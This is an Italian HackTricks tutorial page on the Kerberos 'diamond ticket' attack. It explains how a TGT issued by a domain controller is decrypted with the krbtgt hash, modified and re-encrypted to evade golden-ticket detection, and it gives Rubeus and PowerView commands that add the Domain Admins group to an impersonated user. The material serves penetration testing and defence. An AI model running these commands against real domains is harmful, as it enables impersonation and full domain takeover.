# Diamond Ticket

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repository di Github**.

</details>

## Diamond Ticket

**Come un biglietto d'oro**, un diamond ticket è un TGT che può essere utilizzato per **accedere a qualsiasi servizio come qualsiasi utente**. Un biglietto d'oro viene forgiato completamente offline, criptato con l'hash krbtgt di quel dominio, e quindi passato in una sessione di accesso per l'uso. Poiché i controller di dominio non tengono traccia dei TGT che hanno emesso legittimamente, accetteranno volentieri TGT criptati con il proprio hash krbtgt.

Ci sono due tecniche comuni per rilevare l'uso di biglietti d'oro:

* Cercare TGS-REQ che non hanno una corrispondente AS-REQ.
* Cercare TGT con valori ridicoli, come il valore predefinito di 10 anni di Mimikatz.

Un **diamond ticket** viene creato **modificando i campi di un TGT legittimo emesso da un DC**. Questo viene realizzato **richiedendo** un **TGT**, **decrittandolo** con l'hash krbtgt del dominio, **modificando** i campi desiderati del biglietto, quindi **ricriptandolo**. Questo **supera le due limitazioni sopra menzionate** di un biglietto d'oro perché:

* I TGS-REQ avranno un precedente AS-REQ.
* Il TGT è stato emesso da un DC, il che significa che avrà tutti i dettagli corretti dalla policy di Kerberos del dominio. Anche se questi possono essere accuratamente falsificati in un biglietto d'oro, è più complesso e suscettibile a errori.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
